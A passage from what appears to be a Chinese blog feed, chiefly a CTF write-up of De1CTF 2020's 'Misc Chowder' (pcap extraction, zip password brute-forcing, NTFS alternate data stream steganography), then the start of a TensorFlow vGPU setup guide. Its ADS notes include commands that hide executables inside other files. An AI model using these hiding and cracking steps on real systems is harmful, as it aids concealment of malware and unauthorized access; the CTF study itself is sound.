their 10% innovation time over  several years.</p><p>官方 GitHub 仓库<a href="https://github.com/gchq/CyberChef" target="_blank" rel="noopener">在这里</a>。</p></blockquote><p>大概就这样了8</p><p>（溜</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 De1CTF Misc Chowder WriteUp</title>
      <link href="/2020/05/04/CTF_2020De1CTF/"/>
      <url>/2020/05/04/CTF_2020De1CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/05/04/CTF_2020De1CTF/b1532fb9c0444888a6b2ce5d56cbf1f5.png" alt=""></p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><strong>奔涌吧，后浪！</strong>今天是五四青年节，<strong>节日快乐呀！</strong></p><p>这几天有个 De1CTF，五一前几天出去玩了，考虑到今天早上比赛就结束了，于是昨晚来看了一眼题目，做了个 <strong>Misc 杂烩题</strong>来感受一下，还是挺有意思的。</p><blockquote><p><strong>De1CTF 2020</strong></p><p>竞赛时间： 2020-05-02 09:00:00——2020-05-04 09:00:00<br>参赛方式：组队</p><p>本届De1CTF是由XCTF联赛的合作单位De1ta战队组织，由赛宁网安提供技术支持。作为第六届XCTF国际联赛的分站赛，本次比赛将采用在线网络安全夺旗挑战赛的形式，面向全球开放。</p><p>此次比赛冠军队伍将直接晋级第六届XCTF总决赛（总决赛具体地点时间待定，将在确定后通知获得资格的国际和国内队伍）。其他参赛的队伍也将获得积分，来竞争XCTF决赛的其他席位。</p><p>大多数情况下，flag的形式为De1CTF{this_is_a_sample_flag}，请提交包含De1CTF{}的完整flag，来进行得分；如果flag是其他形式，题目中会阐明。</p><p>比赛平台： <a href="https://adworld.xctf.org.cn" target="_blank" rel="noopener">https://adworld.xctf.org.cn</a></p></blockquote><p>面向全球开放可还行，于是乎比赛题目都双语的，还用了 Google Drive 做附件存储。看了一下排行榜，歪果师傅们贼厉害啊。</p><p>最后顺便<strong>总结了一下关于 NTFS 交换数据流的相关应用</strong>吧。</p><br><hr><h2 id="Misc杂烩-Misc-Chowder"><a href="#Misc杂烩-Misc-Chowder" class="headerlink" title="Misc杂烩/Misc Chowder"></a>Misc杂烩/Misc Chowder</h2><blockquote><p><a href="https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing</a></p><p><strong>Hints:</strong></p><p>流量包中的网络连接对解题没有帮助 The network connection in pcap is not helping to the challenge</p><p>不需要访问流量里任何一个的服务器地址，所有数据都可以从流量包里直接提取 Do not need to connect the network, every data can be extracted from the pcap</p><p>In the burst test point of compressed packet password, the length of the  password is 6, and the first two characters are “D” and “E”.  压缩包密码暴破考点中，密码的长度为6位，前两位为DE。</p></blockquote><h3 id="网络流量提取"><a href="#网络流量提取" class="headerlink" title="网络流量提取"></a>网络流量提取</h3><p>首先 Google Drive 下载下来是个流量抓包文件 <code>Misc_Chowder.pcap</code>。</p><p>根据提示，网络连接和服务器地址都没用的，那直接导出 HTTP 对象好了。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504174624485.png" alt="http对象"></p><p>按照大小排序发现是上传文件的页面，表格里是上传的文件。</p><p>依次有7张图片，分别导出来。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504174851276.png" alt="导出分组字节流"></p><p>前6张是正常的图片，第7张 <code>7.png</code>，是一个 Google Drive 的分享地址。</p><p><img src="/2020/05/04/CTF_2020De1CTF/7.png" alt="7.png"></p><p>也就是</p><blockquote><p><a href="https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view" target="_blank" rel="noopener">https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view</a></p></blockquote><p>（这里最开始我数字<code>1</code>和字母<code>l</code>没分清楚，于是访问了没分享文件，仔细看了才发现……</p><h3 id="Word-隐写"><a href="#Word-隐写" class="headerlink" title="Word 隐写"></a>Word 隐写</h3><p>下载后解压得到一个 <code>readme.docx</code>，打开报错，看来文件里改了啥东西。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504175546409.png" alt=""></p><p>选择<code>是</code>后得到以下内容，看起来好像是没啥关系（确定）。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504175819109.png" alt="word内容"></p><p>看了一下文本也没有隐藏文字，看来是 word 内容用处不大。</p><p>我们都知道，<code>.docx</code>格式的 word 其实对应着一个压缩包，那就用压缩文件打开看看。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504180118698.png" alt="word隐写"></p><p>发现直接就在目录下，简单干脆真好。</p><h3 id="压缩包密码暴破"><a href="#压缩包密码暴破" class="headerlink" title="压缩包密码暴破"></a>压缩包密码暴破</h3><p><code>You_found_me_Orz.zip</code> 里有一个 <code>You_found_me_Orz.jpg</code>，题目中有 hint 说 密码的长度为6位，前两位为<code>DE</code>。于是就来爆破好了。</p><p>使用 <code>DE????</code> 进行掩码爆破，最开始先试了一下纯大写字母、纯小写字母、纯数字、大小写字母组合，发现都不对，后来试了大写字母和数字组合，跑了一阵子密码出来了。就是 <code>DE34Q1</code>.</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504180549996.png" alt="压缩包密码爆破"></p><p>话说为啥这个不能跑满 CPU，感觉爆破好慢……</p><p>正好有带佬发现了一个破解 zip 文件的工具/库，叫 <strong>yazc</strong> (Yet Another Zip Cracker).</p><p>仓库在这里：<a href="https://github.com/mferland/libzc" target="_blank" rel="noopener">https://github.com/mferland/libzc</a></p><blockquote><p>The libzc library is a simple zip cracking library. It also comes with a command line tool called ‘yazc’ (Yet Another Zip Cracker).</p></blockquote><p>不过对于掩码爆破，估计要先生成一个字典再来爆破。</p><p>解压后得到了这张图片。</p><p><img src="/2020/05/04/CTF_2020De1CTF/You_found_me_Orz.jpg" alt="You_found_me_Orz"></p><h3 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h3><p>拖进 010editor 里看了一下，发现文件拼接了一个rar压缩包。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504181706421.png" alt="图像隐写"></p><p>foremost 没提取出来，于是手动提取一波得到了这个压缩包。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504181912463.png" alt="rar"></p><p>解压上面的 rar 压缩包，得到的<code>flag.txt</code>内容如下：</p><blockquote><p>De1CTF{jaivy say that you almost get me!!! }</p></blockquote><p>啥？？？又有假的 flag！不过快了快了。</p><p><em>（顺便查了一下<code>jaivy</code>是个师傅的 ID</em></p><p><code>123.txt</code></p><blockquote><p>this is a 123.txt file from jaivy!</p></blockquote><p><code>666.jpg</code></p><p><img src="/2020/05/04/CTF_2020De1CTF/666.jpg" alt="666"></p><p>假的 jpg，实际上是 png 啦。</p><p>看了半天这个图片，都没找到哪里有隐写……常见的图像隐写都不起作用。</p><h3 id="NTFS-交换数据流隐写"><a href="#NTFS-交换数据流隐写" class="headerlink" title="NTFS 交换数据流隐写"></a>NTFS 交换数据流隐写</h3><p>最后又去看了看压缩包的 Hex，发现最后这里有个奇妙的东西看着就不对劲。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504205717969.png" alt=""></p><p>你看它多像 flag 呀！</p><p>再看这个冒号<code>:</code>，突然想起来之前看师傅们关于内存取证的 WP 里提到过 <strong>NTFS 交换数据流隐写</strong>，虽然没细看，但说不定这里就是呢！</p><p>于是查了一下相关的资料。</p><blockquote><p>在 NTFS 文件系统中存在着 NTFS 交换数据流（Alternate Data Streams，简称 ADS），这是 NTFS 磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是 NTFS 交换数据流。</p><p>ADS 的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个 favicon 数据流以存放网站图标。</p><p>ADS 也被用于一些恶意文件隐藏自身,作为后门。</p></blockquote><p>要查看 ADS 内容，可以使用 Ntfs Streams Editor 软件，或者 LADS，或者用 <code>dir /r</code>。</p><p>要<strong>注意</strong>的是，这里有个坑，<strong>使用除 WinRAR 以外的软件进行提取会造成数据流丢失。</strong>所以<strong>必须要用 WinRAR 来解压才行！</strong></p><p>这里坑死我了，我用 Bandizip 解压后找了半天都没找到这个 txt 文件，最后迫不得已下了个 WinRAR，广告烦死了（（</p><p>解压后通过 <code>dir /r</code> 可以看到哪里有 ADS。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504215546635.png" alt="dir"></p><p>这里发现就藏在 <code>666.jpg</code> 里了呀！</p><p>使用 <code>notepad</code> 可以查看里面的内容了。</p><pre class=" language-bash"><code class="language-bash">notepad 666.jpg:fffffffflllll.txt</code></pre><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504215709498.png" alt="flag"></p><p>于是 flag 就是</p><p><code>De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb}</code></p><br><hr><h2 id="关于-NTFS-ADS-的一些总结"><a href="#关于-NTFS-ADS-的一些总结" class="headerlink" title="关于 NTFS ADS 的一些总结"></a>关于 NTFS ADS 的一些总结</h2><p>这里顺便再整理一下吧，方便后面需要的时候来找。</p><h3 id="查看-ADS"><a href="#查看-ADS" class="headerlink" title="查看 ADS"></a>查看 ADS</h3><h4 id="LADS"><a href="#LADS" class="headerlink" title="LADS"></a>LADS</h4><p>除了使用上面的方法查看外，还可以使用 LADS 工具。</p><p><strong>下载地址：</strong> <a href="https://files.cnblogs.com/files/rainbow7/lads.zip" target="_blank" rel="noopener">戳这里</a></p><p><strong>使用方法：</strong></p><p>搜索 <code>File</code> 所在目录及其子目录下的所有数据流：（<code>/S</code>表示递归子目录）</p><pre class=" language-bash"><code class="language-bash">lads.exe File /S</code></pre><p>或者把lads复制到要搜索的目录，就不用指定file了。</p><pre class=" language-bash"><code class="language-bash">lads.exe /S</code></pre><p>而后再用 notepad 之类打开就完事了。</p><p>或者<strong>也可以用 powershell 查看内容</strong>。</p><p>利用 <code>-Stream</code> 参数来提取。</p><pre class=" language-powershell"><code class="language-powershell"><span class="token function">cat</span> <span class="token punctuation">.</span>\666<span class="token punctuation">.</span>jpg <span class="token operator">-</span>Stream fffffffflllll<span class="token punctuation">.</span>txt<span class="token comment" spellcheck="true"># 其实就是 Get-Content .\666.jpg -Stream fffffffflllll.txt</span></code></pre><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504223649771.png" alt="powershell"></p><p>不过怎么说呢，这个软件挺老了，<a href="http://www.heysoft.de/" target="_blank" rel="noopener">作者网站</a>上说Windows下用 <code>dir /r</code> 都有这个功能了，于是不再需要 LADS 了，也因此不提供下载了，妙啊 2333.</p><h4 id="AlternateStreamView"><a href="#AlternateStreamView" class="headerlink" title="AlternateStreamView"></a>AlternateStreamView</h4><p>这个网上一搜就有下载了。</p><p>使用起来也简单方便。支持数据流的查看和提取。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504222903711.png" alt="AlternateStreamView"></p><h4 id="Ntfs-Streams-Editor"><a href="#Ntfs-Streams-Editor" class="headerlink" title="Ntfs Streams Editor"></a>Ntfs Streams Editor</h4><p><strong>下载地址：</strong> <a href="https://ntfs-streams-info.en.softonic.com/" target="_blank" rel="noopener">https://ntfs-streams-info.en.softonic.com/</a></p><p>或者 <a href="http://pan.baidu.com/s/1c2zbNaC" target="_blank" rel="noopener">http://pan.baidu.com/s/1c2zbNaC</a></p><p>使用起来也很方便，搜索文件所在目录就可以了，而且直接就把隐藏在 ADS 中的内容显示出来了。</p><p>（就是这个软件报毒说有广告啥的，emmm 看个人吧，也是个老软件了</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504220908382.png" alt="Ntfs Streams Editor"></p><p>当然，貌似用一些内存取证的工具也能提取，这里不说了啦。</p><h3 id="写入-ADS"><a href="#写入-ADS" class="headerlink" title="写入 ADS"></a>写入 ADS</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><p>首先创建一个文件，再写入隐藏的信息。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"hello"</span> <span class="token operator">></span> 1.txt<span class="token keyword">echo</span> <span class="token string">"miaotony"</span> <span class="token operator">></span> 1.txt:2.txt</code></pre><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504224344130.png" alt="写入ADS"></p><p>注意一下，用<code>dir</code>是看不到这个隐藏的数据流哒。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504224556651.png" alt="dir"></p><p>同理使用 binwalk / foremost 也不能看到隐写的数据。</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>还可以使用<code>type</code>命令，将已经存在的文件附加上去。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># type "要隐藏的附加文件">"宿主文件":"要隐藏的附加文件"</span><span class="token function">type</span> <span class="token string">"2.txt"</span> <span class="token operator">></span> <span class="token string">"1.txt"</span><span class="token keyword">:</span><span class="token string">"2.txt"</span></code></pre><p>可以用它来向 ADS 中写入图像/音频/可执行文件。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">type</span> <span class="token string">"hidden.jpg"</span> <span class="token operator">></span> <span class="token string">"targe.jpg"</span><span class="token keyword">:</span><span class="token string">"hidden.jpg"</span><span class="token function">type</span> <span class="token string">"hidden.mp4"</span> <span class="token operator">></span> <span class="token string">"targe.jpg"</span><span class="token keyword">:</span><span class="token string">"hidden.mp4"</span><span class="token function">type</span> <span class="token string">"hidden.exe"</span><span class="token operator">>></span><span class="token string">"targe.txt"</span><span class="token keyword">:</span><span class="token string">"hidden.exe"</span><span class="token function">type</span> <span class="token string">"hidden.exe"</span><span class="token operator">>></span><span class="token string">"targe.exe"</span><span class="token keyword">:</span><span class="token string">"hidden.exe"</span></code></pre><p>不过在 Windows Vista 及后续系统中已经无法直接运行 ADS 中的可执行文件了。</p><h3 id="删除-ADS"><a href="#删除-ADS" class="headerlink" title="删除 ADS"></a>删除 ADS</h3><p>可以使用 Ntfs Streams Editor，搜索到勾选删除就好。</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504224924332.png" alt="删除ADS"></p><p>也可以使用<code>streams.exe</code>这个软件删除。</p><p>下载地址：<a href="https://files.cnblogs.com/files/rainbow7/streams.zip" target="_blank" rel="noopener">戳这里</a></p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504225625810.png" alt="streams"></p><pre class=" language-bash"><code class="language-bash">streams.exe -d <span class="token operator">&lt;</span>File<span class="token operator">></span></code></pre><p>加入<code>-s</code>参数则递归子目录删除。</p><p>如果报错就先把相关的进程结束掉再执行。</p><p>注意不要在根目录下执行，以防删除有用的数据流呀。</p><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>再说个有意思的事，浏览器下载文件的时候，会向文件添加一个数据流，标记该文件来源于外部，即可能带有风险。</p><p>估计 office 提示也是根据这个来的吧，嘻嘻。<em>（之前还想过这个问题呢 233</em></p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504230628501.png" alt="受保护的视图"></p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504230819269.png" alt="文件中包含的ADS"></p><p>主要蹭这个机会理了一下 NTFS 交换数据流的相关应用。</p><p>这次 De1CTF 题目质量还是很不错的，Misc 签到题 Telegram Channel 看一眼就能拿分，问卷题访问就拿到手了，还是很友好的呢。</p><p>至于出现一堆 <code>mc_*</code>与 minecraft 有关的题，出题人是多喜欢 MC 啊，emmm 太难了没搞懂<em>（虽然没细看</em>。 <del>什么 easybgm 噢真没找到隐写在哪里。。</del></p><p>大概就是这些内容了吧。</p><p><em>（溜了溜了  结课论文要写不完了</em></p><br><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html" target="_blank" rel="noopener">NTFS交换数据流隐写的应用</a></p><p><a href="https://www.freebuf.com/column/205245.html" target="_blank" rel="noopener">NTFS交换数据流隐写（上）</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16.04配置TensorFlow-vGPU环境</title>
      <link href="/2020/04/29/Server_TensorFlow-vGPU/"/>
      <url>/2020/04/29/Server_TensorFlow-vGPU/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>众所周知，机器学习对于计算机的算力要求很高，而 GPU 中的并行计算能有效地提高计算效率。NVIDIA 家的 GPU 大都支持 CUDA<em>（Compute Unified Device Architecture）</em>平台，TensorFlow 等机器学习/深度学习框架大都以 CUDA 为基础实现了 GPU 加速计算。</p><blockquote><p><em>CUDA</em> ® is a parallel computing platform and  programming model developed by NVIDIA for general computing on graphical processing units (GPUs). With <em>CUDA</em>, developers are able to dramatically speed up computing applications by harnessing the power of GPUs.</p><p><strong>CUDA</strong>（<strong>C</strong>ompute <strong>U</strong>nified <strong>D</strong>evice <strong>A</strong>rchitecture，<strong>统一计算架构</strong>）是由NVIDIA所推出的一种集成技术，是该公司对于GPGPU的正式名称。透过这个技术，用户可利用NVIDIA的GeForce 8以后的GPU和较新的Quadro GPU进行计算。亦是首次可以利用GPU作为C-编译器的开发环境。</p></blockquote><p>另外提一下 vGPU，这个概念好像是2018年提出来的，还算比较新的。考虑到有些程序需要在 Linux 环境下运行，而在 Windows 下一个选择是开一个虚拟机。之前还在想虚拟机里能不能用独立显卡，能否实现在虚拟机里调用 CUDA 进行计算。vGPU 的出现就提供了这一可能。</p><p>vGPU 即虚拟 GPU，可以为每个虚拟桌面提供 GPU 体验。NVIDIA 虚拟 GPU 软件使每台虚拟机都能像物理桌面一样利用 GPU。由于通常由 CPU 完成的工作已经转移到了 GPU，因此用户能够获得更好的体验，并且可以支持更多的用户。 </p><p>其实按我的理解，简单来说就是对物理上的 GPU 做了虚拟化，这样在虚拟机上可以共享一个或多个 GPU。使用的时候就和平常用真实的 GPU 没有什么区别。感觉还是挺不错的，一定程度上有利于资源的合理利用嘛。不过具体的原理我也不清楚呢。（悄咪咪</p><p>更多关于 vGPU 的信息可以去<a href="https://www.nvidia.cn/data-center/virtualization/" target="_blank" rel="noopener">官网</a>了解一下。</p><br><p>其实之前配过 Windows 系统上的 GPU，成功实现了的。<em>（然而不记得了）</em></p><p>然而上次配 CentOS 系统上的 GPU，有点问题折腾了好久一直都用不了，于是不知道怎么整就一直闲置着……</p><p>最近别人帮忙换了 Ubuntu 系统，重新配置了一下 GPU 资源，装好了显卡驱动。然后我折腾了一个下午，终于在 Ubuntu 16.04 系统上配置好了 TensorFlow 的 vGPU 环境，这里来做一下笔记啦。<em>（不然过几个月甚至过几天就不记得了呢）</em></p><p><del><em>（什么时候成运维的了。。</em></del></p><p>唉，其实挺麻烦的，这里面也挺多坑的，特别是版本问题很容易导致配置失败。这里参考了挺多网上的资料还有前人分享的经验教训，以<strong>软件配置</strong>为主，大概包括下面几个<strong>步骤</strong>吧。</p><ul><li><p><strong>安装 Ubuntu 虚拟机</strong></p></li><li><p><strong>安装 NVIDIA 显卡驱动及授权</strong></p></li><li><p><strong>安装 CUDA Toolkit</strong> </p></li><li><p><strong>安装 Anaconda3</strong></p></li><li><p><strong>安装 tensorflow-gpu 版本（包括了 cuDNN）</strong></p></li></ul><br><hr><h2 id="0x01-安装前准备"><a href="#0x01-安装前准备" class="headerlink" title="0x01 安装前准备"></a>0x01 安装前准备</h2><p>请确认要安装的各软件的版本之间是否匹配，如果不匹配很容易就配置失败了！</p><p>我这里的系统是 Ubuntu 16.04。</p><p>（Linux下）<strong>tensorflow-gpu 版本与 cuDNN 及 CUDA 版本关系</strong>如下，最新版本及其他系统请参考<a href="https://tensorflow.google.cn/install/source" target="_blank" rel="noopener">官方这里</a>。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200429224117508.png" alt="tensorflow版本与cuDNN及CUDA版本关系"></p><p>Tensorflow 2.x 版本挺新的，API 也改了不少，这里看1.x版本好了。</p><p>目前 Tensorflow 1.x 版本最新的是 1.15.0 了，上面这些是<strong>经过测试的构建配置</strong>，新版本的 CUDA 和 cuDNN 不保证一定能用，但低版本不行的。特别是 CUDA 和 cuDNN 版本要对应上。</p><p><strong>CUDA Toolkit 与 显卡驱动之间的对应关系</strong>如下，最新版本请参考<a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html" target="_blank" rel="noopener">官方这里</a>。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200429223146918.png" alt="CUDA Toolkit and Compatible Driver Versions"></p><p>这里是 CUDA 工具包所要求的显卡驱动的最低版本。</p><p>例如 TensorFlow-gpu 1.13 以上版本需要 CUDA 10.0，显卡驱动至少要 410.48 以上这样。</p><br><hr><h2 id="0x02-安装-Ubuntu-虚拟机"><a href="#0x02-安装-Ubuntu-虚拟机" class="headerlink" title="0x02 安装 Ubuntu 虚拟机"></a>0x02 安装 Ubuntu 虚拟机</h2><p>这里是以服务器上安装为例的，我这里现成配好了的，大概就参考下面这一篇好了。</p><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141</a></p><br><hr><h2 id="0x03-安装-NVIDIA-显卡驱动及授权"><a href="#0x03-安装-NVIDIA-显卡驱动及授权" class="headerlink" title="0x03 安装 NVIDIA 显卡驱动及授权"></a>0x03 安装 NVIDIA 显卡驱动及授权</h2><p>这里别人帮配好了的，同样参考<a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141" target="_blank" rel="noopener">上面那一篇</a>，这里记录一下吧，顺便借一下图。</p><h3 id="0x03-1-安装显卡驱动"><a href="#0x03-1-安装显卡驱动" class="headerlink" title="0x03-1 安装显卡驱动"></a>0x03-1 安装显卡驱动</h3><p>虚拟机新建一个文件夹，然后上传类似于 <code>NVIDIA-Linux-x86_64-430.63-grid.run</code> 的显卡驱动文件。</p><p><strong>注意一下这个版本要满足 0x01 中的条件。</strong></p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180342ucwqytqncnm09lwc.png" alt="">   </p><p>或者可以这样↓。</p><p>首先添加源。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:graphics-drivers/ppa<span class="token function">sudo</span> apt update</code></pre><p>检查可以安装的驱动版本，选择最合适的版本安装即可。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> apt <span class="token function">install</span> nvidia-driver-XXX</code></pre><p><strong>安装显卡驱动</strong>的时候需要注意，先执行<code>sudo init 3</code> 然后在驱动文件目录下执行<code>sudo sh  显卡驱动名 --no-opengl-files</code>  （加<code>--no-opengl-files</code>的目的是为了防止图形界面登录的时候循环输入密码的情况），然后按照提示执行下一步就可以。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180352u8rlu2u8hryf27r7.png" alt="">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180357vu66uuriaa6ut26a.png" alt=""><br><img src="/2020/04/29/Server_TensorFlow-vGPU/180405qtt59evncw7v70w0.png" alt=""> </p><p>显卡安装完成后进行检查，<strong>执行<code>nvidia-smi</code></strong>，如果输出类似如下，则代表显卡安装成功。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180411yjjzmrda8djr7ada.png" alt="">   </p><p>类似于下面这样的。（我这里显卡驱动版本为 440.56）</p><pre><code>+-----------------------------------------------------------------------------+| NVIDIA-SMI 440.56       Driver Version: 440.56       CUDA Version: 10.2     ||-------------------------------+----------------------+----------------------+| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC || Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. ||===============================+======================+======================||   0  GRID P100D-2Q      On    | 00000000:02:00.0 Off |                  N/A || N/A   N/A    P0    N/A /  N/A |     144MiB / 2032MiB |      0%      Default |+-------------------------------+----------------------+----------------------++-----------------------------------------------------------------------------+| Processes:                                                       GPU Memory ||  GPU       PID   Type   Process name                             Usage      ||=============================================================================||  No running processes found                                                 |+-----------------------------------------------------------------------------+</code></pre><h3 id="0x03-2-显卡授权"><a href="#0x03-2-显卡授权" class="headerlink" title="0x03-2 显卡授权"></a>0x03-2 显卡授权</h3><p>下面进行<strong>显卡授权</strong>的配置。</p><blockquote><p>如果使用的是切分显卡，那么授权一定是 vDWS 授权类型，此处需要提前先部署好 vGPU 授权服务器，授权服务器的部署，此处不再赘述。</p><p>然后再虚拟机中配置授权信息，执行命令<code>cd /etc/nvidia</code>，然后<code>ls</code>查看会有一个授权文件配置模板，然后执行命令 <code>sudo cp gridd.conf.template  gridd.conf</code>。</p></blockquote><p><img src="https://bbs.sangfor.com.cn/data/attachment/forum/202004/07/180420qzxi4vur4iznr7bo.png" alt="">   </p><blockquote><p>编辑授权信息，执行 <code>sudo vim gridd.conf</code>，然后需要配置三个地方，也即<strong>授权服务器的地址、端口、以及授权类型</strong>，填写完成保存之后执行命令 <code>systemctl restart nvidia-gridd</code>。</p></blockquote><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180429v0o6sk76pcx6x76z.png" alt="">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180435lj46knr6kv8kkrjz.png" alt="">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180441krcfyttcvmlkyfmu.png" alt="">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180447are3iooz8m3g00o0.png" alt="">  </p><p>而后在授权服务器确认虚拟机是否已经获取到授权。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180453n4gudc4v8cgmzpdd.png" alt=""></p><p>到这里为止，下面的步骤就和 vGPU 没有很大的关系了，<strong>就当物理机上的真实 GPU 使用就好了</strong>。</p><p>也就是说下面的步骤对于 Linux 下的 GPU 理论上都是通用的啦。</p><br><hr><h2 id="0x04-利用-Docker-快速启用-TensorFlow-GPU-支持"><a href="#0x04-利用-Docker-快速启用-TensorFlow-GPU-支持" class="headerlink" title="0x04 利用 Docker 快速启用 TensorFlow GPU 支持"></a>0x04 利用 Docker 快速启用 TensorFlow GPU 支持</h2><p>这里打断一下，说一个快速启用 TensorFlow GPU 支持的方案。如果只是想体验一下，或者在 docker 中构建的话，可以参考一下，不需要后面的步骤就能快速启用了。</p><blockquote><p><a href="https://docs.docker.com/install/" target="_blank" rel="noopener">Docker</a> 使用容器创建虚拟环境，以便将 TensorFlow 安装结果与系统的其余部分隔离开来。TensorFlow 程序在此虚拟环境中运行，该环境能够与其主机共享资源（访问目录、使用 GPU、连接到互联网等）。我们会针对每个版本测试 <a href="https://hub.docker.com/r/tensorflow/tensorflow/" target="_blank" rel="noopener">TensorFlow Docker 映像</a>。</p><p>Docker 是在 Linux 上启用 TensorFlow <a href="https://www.tensorflow.org/install/gpu?hl=zh-cn" target="_blank" rel="noopener">GPU 支持</a>的最简单方法，因为只需在主机上安装 <a href="https://github.com/NVIDIA/nvidia-docker/wiki/Frequently-Asked-Questions#how-do-i-install-the-nvidia-driver" target="_blank" rel="noopener">NVIDIA® GPU 驱动程序</a>，而不必安装 NVIDIA® CUDA® 工具包。</p></blockquote><p>（来自<a href="https://www.tensorflow.org/install/docker?hl=zh-cn" target="_blank" rel="noopener">官方 Docker 安装教程</a>）</p><p>首先（在虚拟机上）<strong>安装 docker</strong>，而后需要<strong><a href="https://github.com/NVIDIA/nvidia-docker" target="_blank" rel="noopener">安装 NVIDIA Docker 支持</a></strong>。</p><blockquote><p>请通过 <code>docker -v</code> 检查 Docker 版本。对于 19.03 <strong>之前</strong>的版本，您需要使用 nvidia-docker2 和 <code>--runtime=nvidia</code> 标记；对于 <strong>19.03 及之后</strong>的版本，您将需要使用 <code>nvidia-container-toolkit</code> 软件包和 <code>--gpus all</code> 标记。</p></blockquote><p><strong>注意：请确保已正确安装 Nvidia 显卡驱动，docker 版本&gt;=19.03！</strong></p><p>这样就不需要安装 CUDA toolkit 了。</p><p>目前最新的 docker 就是 19.03.8 版本，所以用<code>nvidia-container-toolkit</code> 软件包和 <code>--gpus all</code> 标记。</p><h3 id="0x04-1-安装-nvidia-container-toolkit"><a href="#0x04-1-安装-nvidia-container-toolkit" class="headerlink" title="0x04-1 安装 nvidia-container-toolkit"></a>0x04-1 安装 